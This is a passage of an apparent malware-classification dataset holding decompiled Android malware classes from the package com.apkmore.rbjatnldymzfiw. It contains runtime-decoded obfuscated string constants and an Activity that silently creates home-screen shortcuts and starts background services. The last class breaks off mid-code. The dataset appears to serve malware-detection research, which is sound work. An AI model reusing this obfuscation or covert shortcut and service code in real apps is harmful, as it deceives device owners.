an=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃšÃ¡Ã°Â¸Ã¤Ã£Ã¥ÃªÄ�Ã®Ã£Â¹Ã¬Ã§Ã±Ã©Ã¶ÃžÃµÃ¦Ä�Ã¿Ã¸ÃŸÃ»Ã¢Ã”Ä„y"");   public static final String ao=com.apkmore.rbjatnldymzfiw.j.d.c.a(""x\u00adÂ¿Â¾Â®Ã…Â§Ã€\u00ady"");   public static final String ap=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃªÃœy"");   public static final String aq=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ´Ã´Ã£Ä„y"");   public static final String ar=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ­ÃºÃ°Ã¯Ã´Ã·y"");   public static final String as=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ«Ã¬ÃµÃµÄƒÃ²y"");   public static final String at=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÄ†Ã®Ã¬Ã°y"");   public static final String au=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¶Ã¦Ã³Ã°y"");   public static final String av=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÄ€ÃªÃ±Ã¼Ã­ÄŒÃ¥y"");   public static final String aw=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÄ‰Ã®Ã¥Ã´y"");   public static final String ax=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÄ†Ã¾Ã¯Ã°y"");   public static final String ay=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ»Ã�Ã©Ã¹ÃŸÃ¼Ãœy"");   public static final String az=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃªÄƒÃ®Ä�Ã Ã³ÃžÄ“Ã±y"");   public static final String aA=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¸Ã¡Ã¹Ä�ÃŸÃ¼Ãœy"");   public static final String aB=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ»Ã¨Ã®Ã¹y"");   public static final String aC=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¢Ã¯ÃºÃ£Ã¥Ã˜Ä„Ã¥y"");   public static final String aD=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¢Ã¯ÃºÃ£ÄƒÃ˜Ã½Ã¢y"");   public static final String aE=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¬Ã³Ã¬y"");   public static final String aF=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÄ‚Ã£Ä�Ã«Â¿Ã­Ä‹Ã­Ã­Ã¬y"");   public static final String aG=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃŠÄŽÃ®Ã­ÃªÃ´\u0096Ã‚Ä�ÃºÃ®ÄƒÃ«Ã¦Ã y"");   public static final String aH=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ€Ã¦Ã¯Ã¶y"");   public static final String aI=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ€Ã¹Ã¬Ã»y"");   public static final String aJ=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ³Ã¯y"");   public static final String aK=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ©Ã¶Ã«Ä„Ã›Â°Â´Ã–Ãƒy"");   public static final String aL=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¨Ã¬Ä‚Ã�Ã¶y"");   public static final String aM=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ¿Â®ÃƒÂ§Â¾\u00adÃ�Â½Â»Â°y"");   public static final String aN=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¨Ã³Ä‚Ã�Ã¶y"");   public static final String aO=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ¿Â®ÃƒÂ§Â¾\u00adÃ�Â¾Â´Â®y"");   public static final String aP=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ¸Ã¦Ä‚Ã�Ã¶y"");   public static final String aQ=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ´Ã¹Ã¥Ã½Ã¯Ã®y"");   public static final String aR=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ±Ã²ÄŒÃ˜Ä€Â·Ä‚Ã°Ã±ÃŸy"");   public static final String aS=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¨ÃµÃ±ÃŸÄ‰Ã Ã¿Ã«y"");   public static final String aT=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ²Ã½Ã¬Ã¼Ã Ä„Ã²ÄƒÃ±y"");   public static final String aU=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¨Ã§Ä‚Ã§Ä‰Ã¬Ã´Ã¢y"");   public static final String aV=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¬Ã ÃªÄ€Ã£ÄˆÃªy"");   public static final String aW=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ¦Ã€Â³y"");   public static final String aX=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÄ†Ã·Ã´Ã°y"");   public static final String aY=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ¯ÃŠy"");   public static final String aZ=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃºÃ³Ã±Â©Â¾y"");   public static final String ba=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ”Ã¶Â°y"");   public static final String bb=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ¤Â³Ã˜ÃªÂ¸Â§y"");   public static final String bc=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¯ÃºÃ¯Ã²Ãº\u0098Ã�Â¼y"");   public static final String bd=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÄ„Ã¨Ã›Â²Ã‹\u0099ÃŽÂ¢Ã˜Ã Ã§ÂªÃ©ÃžÃ­Ã�Â²Ã‚\u009fÃŠy"");   public static final String be=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¢ÃºÃ£ÃµÃ±Ä„Â¬ÃªÃ°Ã¾Ã£y"");   public static final String bf=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¸Ã©ÃµÃžÄ“Ã±Â¤Ã²Ã°Ã˜Ã›Ã·y"");   public static final String bg=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ“ÃˆÂ¾Ã¢Â®Ã�Ã�Ã„ÃƒÂ·Â£Ã“Ã‰\u0095Ã†Ã�Ã›Ã˜Ã“Ãžy"");   public static final String bh=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ”ÃŠÃšÃ“Ã…ÃšÃ‰y"");   public static final String bi=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃŽÃ§Ã€Ã�Â¾Ã±Ã¥Â¤Ã‰Ã”Ã�y"");   public static final String bj=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¦ÃŠÃ—ÃŸy"");   public static final String bk=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¿Ã¡Ã¹Ä‚Â¿Ã¾Ã›y"");   public static final String bl=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ§Ã¸Ã¿Ã¡Ã¹y"");   public static final String bm=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ—Ã Ã¹Ã£Ã«y"");   public static final String bn=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ¸Ã³Ã Ä„Ã¼Ã¸Â«Ã¡Ã—Ã�Ã¹Ã³Ã¬y"");   public static final String bo=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂºÃ¿Ã«Ä“Ã±Ã²Ã²Â¼ÃˆÃ�Ä€ÃµÃžy"");   public static final String bp=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ€Ã®ÃŸÃ«Ã¾Ã²y"");   public static final String bq=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ§Ä‚Ã˜Ã·Ã¢ÃŽÃ³Ã­Ã¤Â»\u0096Ã˜Ã¿Ã¯Ã Ã´Â±Ã¡Ã¢Ã¨Ã±Â¯\u0095ÃªÃ¥Ã³Ã¬Ã¤ÂºÃ¬Ã°Ã¾Ã£Ã¼Â£Â°Ã¦ÄŒÃ­Ã«Ã£Â¾Ã¦Ã™Ä‚Ã³Ã Â»Â¢Ã˜Ã¢Ã³Ã¶Ã¬Ã˜Ã¢Ã¬Ã»Ã´Ã­ÂºÃ´Â³Ä�Ã¦Ä„ÃšÃ»Ã´Ä€Ä‚Ã©Â«ÃµÃ¢Ã�Ä…Ã¶Â¥Â¯Ã£Ã§Ã¢Ã¯Ã³Ã¦Ã–ÃµÃ¡Ä�Ã³Â®ÄƒÃ�Ã³ÃºÂ©Ä�Ã¤Ã¼Â©Â¿Ã­Ã´Ã®Ã»ÃŸÃ’Ã³Ä‚Ã¢Ã¾Ã°Â¦Ã¨Ã±Ã®Â±Ã¢Ã´Â¥ÄŠÃµÃ²Ã¯Ã«Ã©ÄƒÃ«ÃºÃ¥Ä„Â©Â¿Ã­Ã´Ã®Ã»ÃŸÃ’Ã³Ä‚Ã¢Ã¾Ã°Â¦ÃªÂ°Ã·Ã¶Â¢Ã¹ÃšÃ³ÃµÂ«Â«Ã�Ã¶Ã¾ÃªÃ¾ÃšÃ±Ã±ÄˆÃ»Ã²\u00adÄ‡Â£ÃœÄ…Â»ÃšÃ¿Ã²Ã£Ã›Ã¦Ã«Ã·ÃžÃ°Ã¦Â¾Â¥Ã Ã»Ã¬Ã²Ã·Ã¡Ã¶Ã«Ã¹Ã¬Ä�Â»ÃºÃ¬Ã³Â¤ÃœÄ…Â»ÃžÄ‡Ã¥ÃœÃžÂ¯ÂªÃ¤Ã¥Ã±Ã¤Ã»Ã¨Ã Ã¿Ã¥ÃµÃ¼\u00adÄ‹Ã¥Ã´Â«ÄŒÃ¿Â±Ã®Ã¾Ã­Ã”Ä„Ã¾Ã¨Ã¸Ã°Ã«\u009eÂ£Ã«Ã³Ã¥Ã­Ã¡ÃµÃ¦Ã³Ã´Ã«Ã´Â½Ã«ÄˆÃ®Ã¿Ã¯ÄƒÂ¸Â¤Â¨Â¾Â y"");   public static final String br=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ¾Ä‚Ã¯Ã©Ã®ÄƒÂ£Â»Ã³Ã¼Ã Ä„Ã£ÃžÃ—y"");   public static final String bs=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¿Ã§Â¸Â¿Ã”y"");   public static final String bt=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃŽÃ¤Ã§Ä€Ã±ÃºÃ«y"");   public static final String bu=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ£Ã±ÃºÃ©Â½Â¾Ä†Ã±Ã²Ã²y"");   public static final String bv=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ“Ã½Ã¸Ã¾Ã£Ã¼ÃžÃŽÃ€Â²Â®Â¯\u009eÃ’Ä�Ã»Ã©Ã°Ã¶Ã Ã”Ã¯Ã¯Â¾\u0095ÃŽÃ‹Ã›ÃŠ\u009fÃƒÂªÂ¶Ã‰\u009eÃ¬Ã Ã¾Ã¡ÄŽÄƒÃ·\u009eÃ�ÃŠ\u008fÃ‡Â¼Â«ÃŠÂ¢Ã‹Ã¤Ã¬Ã®Ã¨Ã£ÃµÂ§Ã†Â³Â¯Ã†\u009cÂ´ÃœÃƒÃ©\u0097Ã“Ã‰Ã±Â¬ÂµÂ¬Ã€Â¤Â£Ã…Ã€Â«ÃŠÂ¢Â¥Ã€ÃˆÃžÂ£Â¸Ã�ÃŠÂ²Â·\u00adÂ»ÂªÂ»Â¾ÂµÃ‡Â®Ã‹\u009dÃ�ÃšÃ‰Ã’Â¯Â¹Â»Ã¤Â®Â¬Â½Â²Â¥Â¢Â·Â¿Â³Â«Â¯Â«Ã‚Ã€\u009fÂ¹ÃŠÃ‹Ã¢\u009eÃ˜ÃƒÃ¢\u009dÃ’ÂºÂ´Â¬ÃƒÂ«\u009fÃˆÂ¼Â«Ã€Â·Â©\u00adÂ£Â¸Ã‘ÂºÃ•\u0098Ã•Ã‘Ã‘Â«Â¯Â´ÃƒÂ¬ÃˆÂ§Ã‡Â¯Ã˜Âµy"");   public static final String bw=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ‘Ã­ÄƒÃ¥ÃµÃ Ä“ÃµÃ³Ã¬y"");   public static final String bx=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ™Ã£ÃºÃ§Â½Â¾Ä‹ÃµÃºÃ£y"");   public static final String by=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÄ’Ã´Ã³ÃµÃ½Ã¥Ã£Ã»Ã´Ã¢Ã²Ã£Ã«Ã›Ã²Ã¸y"");   public static final String bz=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ–y"");   public static final String bA=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ—y"");   public static final String bB=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ˜y"");   public static final String bC=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ™y"");   public static final String bD=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃšy"");   public static final String bE=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ›y"");   public static final String bF=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃœy"");   public static final String bG=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ�y"");   public static final String bH=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃžy"");   public static final String bI=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃŸy"");   public static final String bJ=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ y"");   public static final String bK=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¡y"");   public static final String bL=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¢y"");   public static final String bM=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ£y"");   public static final String bN=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¤y"");   public static final String bO=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¥y"");   public static final String bP=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¦y"");   public static final String bQ=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ§y"");   public static final String bR=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¨y"");   public static final String bS=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ©y"");   public static final String bT=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃªy"");   public static final String bU=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ«y"");   public static final String bV=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¬y"");   public static final String bW=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ­y"");   public static final String bX=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ­Ä„Ã®y"");   public static final String bY=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÄ„Ã§ÄˆÃ Ã²Ã¦Ä‹ÃµÃ¸Ã·y"");   public static final String bZ=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¢ÃºÃªÃ³Ã¯ÄˆÃ¼Ã¸Ã§Ã¾Ã¤y"");   public static final String ca=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃºÃ®Ã­Ã¿y"");   public static final String cb=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ©Ã¯Ã»Ã£Ä‰Ã°Ä€Ã¢y"");   public static final String cc=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¬Ã¬Ã¶ÃºÃ§Ã¸Ã˜Ä„Ã¦ÄŽÃºÂ³Ã´Ã½Ãš\u009dÃ³Ã¼Ã�Ä�Ã±Ã Ã–Â±ÃºÃ¤Ã˜Ã¬Ã™Ã¹ÃªÂ¬Ã¬Ã®Ã©Ã¶Ã§Ä‹Ãœy"");   public static final String cd=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¹Ã¨Ã¿Ã¨Ã«y"");   public static final String ce=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃšÃ¡Ã±Ã¾Ã¨Ã£ÃµÂ²Ã�Â´Ã£ÃºÃ³Ã´ÃºÃ­Ã¶Ã›ÄƒÂ¬ÄƒÃ»Ã»Ã¬Ã»Ã¥Ã�Ã¶y"");   public static final String cf=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ±Â¹Â¬Â´Ã…\u00ady"");   public static final String cg=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¤ÃºÄ‚Ã®Ã�Â¦Â¿Ã¦ÄŒÃ³Â²Ã¬Ã¸Ã¤Ã”Ã´Ã½Ã±Â½Ã¥Ã¥Â¡Ã§Ã«Ã·Â¤Ã±Â§Ã„Â³Â°Â¹Â®ÂµÂ¿Â¯ÃƒÃ›Ã±Ã±y"");   public static final String ch=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xæ„®çª›å‚—å’„é‚‘é�—æ£‰é �äº–y"");   public static final String ci=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xæ�¨æ�–æ™…å¾“é�™å‡´è±›è¿žä¾ˆçœ’äº„é€Œé£·éŸ™ï½³y"");   public static final String cj=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xæ�¢æ�‡æ˜¶å¾®é�§å‡©è¿­ä¾…åŠ�è£—é¤‡éŸ°ï½ºy"");   public static final String ck=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xè²‚é‚…æ�¯å‡¿ä¼©æ™Žå¾†y"");   public static final String cl=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xæ†±è²§æ„§å²„y"");   public static final String cm=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xçœ–æ–´æŽ€ï¾Œy"");   public static final String cn=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ½Ã ï¾œæŠŽåŠ¹å‡™è¶½äº‰é€Œå¯¿è¤´ä¼˜y"");   public static final String co=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xï¾�æ†�è©˜äºƒé–ˆï¾žçŒ‡æ†ˆæ�·è�’ç½�ä¿’ï¾„äº•é€€åž¥åŸ�ï¾’y"");   public static final String cp=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xåŠ‹ä¼ªç½¤æž‡å‘‘y"");   public static final String cq=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¥Ã’å�šå¯§å„ªç«±é™¦äº�è¸½ï¾�è±¬åŠ¡é›œäº’ä¼ æ˜†ä¾�ä»‡å’”åˆ›é‰‹è±ªï½¸y"");   public static final String cr=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xæ¯®åž¤äº‘é€‹Â¬ÃƒÂ¥y"");   public static final String cs=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xå’Žç©¨y"");   public static final String ct=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xç‹‰æž¤y"");   public static final String cu=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xç³¼å ƒy"");   public static final String cv=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xå¦¨å²‡y"");   public static final String cw=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xç°�ä½ƒy"");   public static final String cx=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xäº›è¿ºä¼¥æ¯°å¼˜ç–¦çœ“ç–žæŠ¦é�ªäº™è¿¶ä¼•ï¾œy"");   public static final String cy=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xå‡Ÿè¶¾äºŠé€ˆy"");   public static final String cz=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xæ‹”å½¸y"");   public static final String cA=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xäº�é€‚å°‹æŠ›y"");   public static final String cB=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xç¿—ç½ªå¾€å»�ï¾ƒäº›è¿ºç½§æ¯®y"");   public static final String cC=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xç¿—ç½ªå¾€å»�ï¾ƒäº›è¿ºæœ¡åƒ¨y"");   public static final String cD=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xæ¯µåž­äºŠé€ˆy"");   public static final String cE=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xå°›è¥Šå°‹æŠ›y"");   public static final String cF=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¼Ã¨ÄƒÂ¢Ã¤Ã—Ã¨Ã¾Â£Ã©Ã©Ã�Â²Ã¸Ã¯Ã¬ÃŸÃ«Â®Ã²Ã¾Ã¤Ãµ\u009ey"");   public static final String cG=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ Ã²Ã¾Â£ÃžÃ¯\u0098Ä†Ã­Ã¤Â«Ã®Ã«Ã¿Ã³ÃºÃªÄ„\u009dÄ“ÃµÃ±Ã£Â¯Ã—Ã¡Ã·Ã¯\u009ay"");   public static final String cH=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¥Ã¿Ã¬Ä�Â¬Ã¶Ã£Ä€Ã«Ã”Ä…Ä‚\u009ay"");   public static final String cI=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ°Ã´Ã—Ã“Ä‹Â®Ã­Ã¾Â¢Ã©Ã—Ã´Ã¿Ã¨Ã¨ÃµÂ¦Ã€Â³y"");   public static final String cJ=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ¹Ä‚Ãµ\u009fÃ³Ã�Ã¹Â®Ã¬Ä„Ã«Â°Ã¯Ä„Ã¿Ã³Ã³Ä�Ã™Ã”Â²Ã¾Ã¢Ã²Ã¶Ã¬Ã¤Ã¨ÂªÃ¸Ã£Ã¥Ã�Ä„Â¥Ã Ã¾Ã¯Ã«Ä‚Ã±ÂµÃ›Ã¹Ã¯Ä„Ã¯Ã¸Ã­Ä�Â¢\u008fÃµÃ¯Ã§Ã²Ã§Ã£\u0092ÃµÃ¯Ã´ÃªÃ¦Ã«Ä†Â¦y"");   public static final String cK=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¢Ã»Ã©y"");   public static final String cL=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ®Ã¤Ã§Ã¼Ã¬ÃºÃ£y"");   public static final String cM=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ”ÄŠÄ‚ÃžÄ�Ã°Ã˜ÃžÂ£Ã�Ã·Ã¤Ã³Ã™Ã¹Ãª\u009fÃžÃ°Ã§Ä‚Ã£y"");   public static final String cN=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xæž„åŒ±å›¥äº¬æ–»æŽ…æ˜«ç…ˆï¾‚éˆ¼æ™‚äº™è¿¶y"");   public static final String cO=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xç¿�ç½±é�‹å�®æ˜ªç…˜æ—¼æ�²äº‹æ¯²ç£¤y"");   public static final String cP=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xæ�©è�ˆy"");   public static final String cQ=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xå¼¦ç–­è¿®ä¾�y"");   public static final String cR=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xç½«æ„­æ�§è�›y"");   public static final String cS=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¶Ã£Ä€Ã«Ã”Ä…Ä‚\u0099ÄƒÃ§ÃªÃ¦Â£Ã·Ã²Ã™Ã¦\u0099y"");   public static final String cT=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ­Ã¬Ä…Ã—Ã›Ã»Ã²\u0099Ã½Ã«Ã¥Ã—Â£ÃºÃ¤Ã©Ã¤Ã y""); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\Hnu.code","public class Hnu extends Activity {   private static Activity d=null;   protected i b;   private at c;   private c e;   private c f;   private Context g;   private TranslateAnimation i;   private TranslateAnimation j;   private TranslateAnimation k;   private TranslateAnimation l;   AdapterView.OnItemClickListener f73a=new ab(this);   private Stack h=new Stack();   public static void a(  Context context,  at atVar){     if (atVar.q == null || atVar.q.trim().length() == 0) {       b(context,null,atVar);       return;     }     com.apkmore.rbjatnldymzfiw.j.b.h hVar=new com.apkmore.rbjatnldymzfiw.j.b.h(atVar.q,ay.b(context,h.aB + h.s,atVar.h),0);     hVar.a((Object)0);     aq.a(context,hVar,new z(context,atVar));   }   private void a(  at atVar,  boolean z,  boolean z2){     if (!z) { switch (atVar.e) { case 0: case 1: case 2: case 5: case MotionEventCompat.ACTION_HOVER_MOVE: case 8: case 9: case 10:         if (!z2) {           ay.a(this,am.b(this,atVar),am.a(atVar.F),atVar,ay.f95a,false,false);           break;         }       break;   } } if (atVar.s == 1) {   this.e=new c(this,atVar,false);   this.e.a(this.f73a);   this.e.a(true); }  else if (atVar.e == 2) {   aq.a(this,atVar.d);   atVar.l=2;   ay.b(this,atVar);   finish(); }  else {   atVar.l=2;   ay.b(this,atVar);   ay.c(this,this.c);   finish(); } Intent intent=new Intent(this,(Class<?>)az.c(this.g)); intent.putExtra(h.T,10); startService(intent); } private static Intent b(Context context,at atVar){ Intent intent=new Intent(context,(Class<?>)az.a(context)); intent.setFlags(268435456); intent.putExtra(h.S,true); intent.putExtra(h.R,atVar.f); intent.putExtra(h.aA,atVar.a()); return intent; } public static void b(Context context,String str,at atVar){ Intent intent=new Intent(h.al); intent.putExtra(""android.intent.extra.shortcut.NAME"",atVar.g); intent.putExtra(h.az,true); intent.putExtra(""android.intent.extra.shortcut.INTENT"",b(context,atVar)); Bitmap a2=str != null ? ay.a(context,str,false) : null; if (a2 == null) {   a2=BitmapFactory.decodeResource(context.getResources(),R.drawable.sym_def_app_icon); } intent.putExtra(""android.intent.extra.shortcut.ICON"",ay.a(a2,ay.a(context,"""",true))); context.sendBroadcast(intent); } private void c(){ this.i=new TranslateAnimation(1,0.0f,1,-1.0f,1,0.0f,1,0.0f); a(this.i); this.j=new TranslateAnimation(1,1.0f,1,0.0f,1,0.0f,1,0.0f); a(this.j); this.k=new TranslateAnimation(1,0.0f,1,1.0f,1,0.0f,1,0.0f); a(this.k); this.l=new TranslateAnimation(1,-1.0f,1,0.0f,1,0.0f,1,0.0f); a(this.l); } public View a(){ if (this.h.size() <= 1) {   finish();   return null; } View view=(View)this.h.pop(); view.clearFocus(); view.startAnimation(this.k); this.b=(i)this.h.peek(); setContentView(this.b); this.b.requestFocus(); this.b.requestFocusFromTouch(); this.b.startAnimation(this.l); return this.b; } public void a(TranslateAnimation translateAnimation){ translateAnimation.setDuration(400L); translateAnimation.setFillAfter(true); translateAnimation.setInterpolator(new LinearInterpolator()); } public void a(i iVar){ if (this.h.size() > 0) {   View view=(View)this.h.peek();   view.clearFocus();   view.startAnimation(this.i); } this.h.push(iVar); this.b=iVar; setContentView(iVar); iVar.requestFocus(); if (this.h.size() > 1) {   iVar.startAnimation(this.j); } } @Override public void finish(){ d=null; super.finish(); } @Override protected void onActivityResult(int i,int i2,Intent intent){ super.onActivityResult(i,i2,intent); if (i == 100011 && i2 == 1200 && this.c != null) {   Toast.makeText(this,h.ch + ""["" + this.c.g+ ""]""+ h.cj,1).show();   a(this,this.c);   ay.a(this,null,-1,this.c,ay.f95a,false,true); } finish(); } @Override protected void onCreate(Bundle bundle){ super.onCreate(bundle); this.g=this; c(); com.apkmore.rbjatnldymzfiw.j.b.d.a(this); requestWindowFeature(1); Intent intent=getIntent(); this.c=new at(); if (!this.c.a(intent.getStringExtra(h.aA))) {   finish();   return; } d=this; this.c.l=1; boolean booleanExtra=intent.getBooleanExtra(h.Q,false); boolean booleanExtra2=intent.getBooleanExtra(h.S,false); this.c.f=intent.getIntExtra(h.R,-1); ay.b(this,this.c); a(this.c,booleanExtra2,booleanExtra); } @Override protected void onDestroy(){ super.onDestroy(); } @Override public boolean onKeyDown(int i,KeyEvent keyEvent){ if (i == 4) {   if (this.e != null && this.e.a()) {     return true;   }   if (this.f != null && this.f.a()) {     return true;   }   if ((this.e != null && !this.e.a()) || (this.f != null && !this.f.a())) {     new Handler().postDelayed(new aa(this),300L);     return true;   } } return super.onKeyDown(i,keyEvent); } @Override public void onWindowFocusChanged(boolean z){ super.onWindowFocusChanged(z); } public String toString(){ return super.toString(); } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\i.code","class i extends RelativeLayout implements View.OnClickListener, AdapterView.OnItemClickListener, w {   private LinearLayout f121a;   private u b;   private com.apkmore.rbjatnldymzfiw.j.a.a c;   private TextView d;   private TextView e;   private TextView f;   private TextView g;   private TextView h;   private TextView i;   private ImageView j;   private com.apkmore.rbjatnldymzfiw.j.a.a k;   private ImageView l;   private View.OnClickListener m;   private com.apkmore.rbjatnldymzfiw.j.a.c n;   private FrameLayout o;   private TextView p;   private ImageView q;   private au r;   private Context s;   private boolean t;   private View.OnClickListener u;   private AdapterView.OnItemClickListener v;   public i(  Context context){     super(context);     this.t=true;     this.u=new l(this);     this.v=null;     this.s=context;     this.f121a=new LinearLayout(context);     this.f121a.setId(0);     this.f121a.setOrientation(1);     this.f121a.setBackgroundColor(-1);     addView(this.f121a,new RelativeLayout.LayoutParams(-1,-1));     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setOrientation(0);     linearLayout.setBackgroundDrawable(new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,new int[]{-13514802,-13514802,-13514802}));     this.f121a.addView(linearLayout,-1,-2);     LinearLayout 